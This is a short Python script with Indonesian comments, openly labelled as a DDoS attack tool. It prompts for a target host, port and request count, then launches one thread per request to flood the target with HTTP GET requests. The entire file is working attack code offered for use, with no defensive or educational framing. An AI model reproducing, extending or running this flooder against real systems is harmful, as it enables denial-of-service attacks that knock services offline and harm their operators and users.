import os
import socket
import threading

def send_http_get(target_host, target_port, packet_number):
    try:
        # Membuat socket TCP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            # Menghubungkan socket ke target host dan port
            client_socket.connect((target_host, target_port))

            # Membuat permintaan HTTP GET
            request = f"GET / HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            
            # Mengirim permintaan ke server
            client_socket.send(request.encode())

            # Menerima respons dari server (maksimum 4096 byte)
            response = client_socket.recv(4096)
          
    except ConnectionError as e:
        # Menampilkan pesan kesalahan jika gagal terhubung
        print(f"Error connecting to {target_host}:{target_port}: {str(e)}")
    except Exception as e:
        # Menampilkan pesan kesalahan jika terjadi masalah umum
        print(f"Error: {str(e)}")

def ddos_attack(target_host, target_port, request_count):
    # Melakukan serangan DDoS dengan mengirim sejumlah permintaan GET secara bersamaan
    threads = []
    for i in range(1, request_count + 1):
        # Membuat thread untuk setiap permintaan GET
        thread = threading.Thread(target=send_http_get, args=(target_host, target_port, i))
        threads.append(thread)
        thread.start()
    
    # Menunggu sampai semua thread selesai
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    os.system("clear")
    # Meminta input dari pengguna
    target_host = input("Masukkan hostname atau IP target: ")
    target_port = int(input("Masukkan port target: "))
    request_count = int(input("Masukkan jumlah permintaan yang akan dikirim: "))

    # Memulai serangan DDoS
    ddos_attack(target_host, target_port, request_count)
